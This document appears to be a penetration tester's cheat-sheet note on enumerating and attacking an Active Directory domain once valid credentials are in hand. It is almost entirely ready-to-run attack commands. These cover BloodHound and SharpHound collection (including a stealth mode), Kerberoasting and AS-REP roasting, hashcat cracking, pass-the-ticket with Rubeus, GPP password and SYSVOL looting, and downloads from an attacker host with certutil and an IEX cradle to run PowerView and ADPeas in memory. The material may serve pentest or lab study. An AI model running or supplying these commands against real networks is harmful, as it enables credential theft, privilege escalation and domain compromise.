---
title: AD Post-Creds Enum
type: note
tab: Active Directory
inputs: [Username, Password]
outputs: [Users, Groups, Shares, Hash, Paths]
tags: [ActiveDirectory, Enumeration, Kerberos, SMB, LDAP]
---

# AD Post-Creds Enum

## WHY

Map the domain attack surface after the first valid credential.

## WHEN

- You have valid domain creds.
- You need a path to local admin or DA.

## NEXT

- BloodHound path found: [[Privesc]]
- Local admin found: [[Lateral_Movement]]
- Kerberos hash found: [[../Credentials/Hash Crack]]

## Commands

### BloodHound Collection

#Username #Password #LDAP #ActiveDirectory #Enumeration
Collect BloodHound data with NetExec or `bloodhound-python`, then launch the GUI.

```sh
# Option 1: NetExec collection.
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --dns-server <DC_IP> --bloodhound --collection All

# Option 2: bloodhound-python collection.
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -v --zip -c All,LoggedOn -dc <DC_HOST> -ns <DC_IP>

# Use DNS over TCP when UDP DNS is blocked or unreliable.
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -v --zip -c All -dc <DC_HOST> -ns <DC_IP> --dns-tcp

# Start the BloodHound GUI with Electron sandboxing disabled if needed.
./BloodHound --no-sandbox --disable-gpu
```

### SharpHound Collection

#Shell #PowerShell #ActiveDirectory #Enumeration
Collect BloodHound data from a Windows domain shell when Python collection is unreliable.

```powershell
# Run SharpHound executable collector.
.\SharpHound.exe -c All --zipfilename loot.zip
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename loot.zip
.\SharpHound.exe -c All --stealth

# PowerShell collector.
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
```

### Kerberoast

#Username #Password #Kerberos #ActiveDirectory #Exploitation
Kerberoast with Impacket or NetExec, then crack the TGS hash.

```sh
# Option 1: Impacket.
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile tgs.hashes

# Option 2: NetExec.
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting tgs.hashes

# Crack the captured TGS hash.
hashcat -m 13100 tgs.hashes <WORDLIST>
```

### Rubeus Kerberos Checks

#Shell #PowerShell #Kerberos #ActiveDirectory #Enumeration
Use Rubeus from a Windows domain shell for roastable users, tickets, and pass-the-ticket workflows.

```powershell
# AS-REP roast and Kerberoast from a domain context.
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe kerberoast /outfile:kerb.txt /format:hashcat

# Request and inject a TGT with an NTLM hash.
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt

# Inject or inspect tickets.
Rubeus.exe ptt /ticket:<TICKET>.kirbi
Rubeus.exe dump /nowrap
Rubeus.exe monitor /interval:5 /nowrap
```

### SMB / LDAP Enum

### SMB Enum With NetExec

#Username #Password #SMB #ActiveDirectory #Enumeration
Enumerate users, groups, and shares over SMB.

```sh
nxc smb <DC_IP> -u <USER> -p '<PASS>' --users
nxc smb <DC_IP> -u <USER> -p '<PASS>' --groups
nxc smb <DC_IP> -u <USER> -p '<PASS>' --shares

# Useful NetExec modules after valid creds.
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_password
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus
```

### LDAP Enum With NetExec

#Username #Password #LDAP #ActiveDirectory #Enumeration
Enumerate users and groups over LDAP.

```sh
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups
```

#Username #Password #SMB #ActiveDirectory #Enumeration
Check password policy.

```sh
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
```

### PowerView

#Shell #ActiveDirectory #Enumeration
Load PowerView directly into memory and run quick domain checks.

```powershell
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1') | IEX

Get-DomainController
Get-DomainController | Select-Object Name
Find-LocalAdminAccess
Get-DomainGroup -Name "Domain Admins"
Get-DomainUser
Get-DomainGroup
Get-DomainComputer | Select-Object dnshostname,operatingsystem
Get-DomainGroupMember -Identity "Domain Admins"
Find-DomainShare -CheckShareAccess
Get-DomainGPO
Get-DomainTrust
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
```

### LDAP Search With Credentials

#Username #Password #LDAP #ActiveDirectory #Enumeration
Query LDAP directly when NetExec output is too broad or you need a specific OU/filter.

```sh
# Enumerate groups inside a specific OU.
ldapsearch -x -H ldap://<DC_IP> \
  -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "OU=<OU_NAME>,DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>" \
  "(objectClass=group)" cn
```

### ADPeas

#Shell #PowerShell #ActiveDirectory #Enumeration
Run ADPeas from a domain context, save output, then search for high-signal AD attack paths.

```powershell
# Download ADPeas to the Windows target.
certutil.exe -urlcache -f http://<LHOST>/ADPeas.ps1 ADPeas.ps1
powershell -c "iwr http://<LHOST>/ADPeas.ps1 -OutFile ADPeas.ps1"

# Import and run ADPeas.
powershell -ep bypass
Import-Module .\ADPeas.ps1
Invoke-ADPeas

# Save output for review.
Invoke-ADPeas | Tee-Object -FilePath adpeas.out
Invoke-ADPeas | Out-File adpeas.out

# Search high-signal AD findings.
Select-String -Path .\adpeas.out -Pattern "Kerberoast|ASREPRoast|Delegation|Unconstrained|Constrained|RBCD|AdminCount|GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword|LAPS|GMSA|Password|Credential|Domain Admin|Enterprise Admin|Local Admin|SPN|ACL|DCSync" -CaseSensitive:$false
```

### AD CS

#Username #Password #ActiveDirectory #Enumeration
Find vulnerable AD CS templates.

```sh
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
```

### SYSVOL Looting

#Username #Password #SMB #ActiveDirectory #Looting
Search SYSVOL for interesting files.

```sh
smbclient //<DC_IP>/SYSVOL -U '<DOMAIN>/<USER>%<PASS>'
```

## Gotchas

- BloodHound collection is usually the fastest route to a privesc path.
- Kerberoast requires valid creds or an existing Kerberos-authenticated context, but not elevated privileges.
- Check AD CS early; one vulnerable template can shortcut to DA.
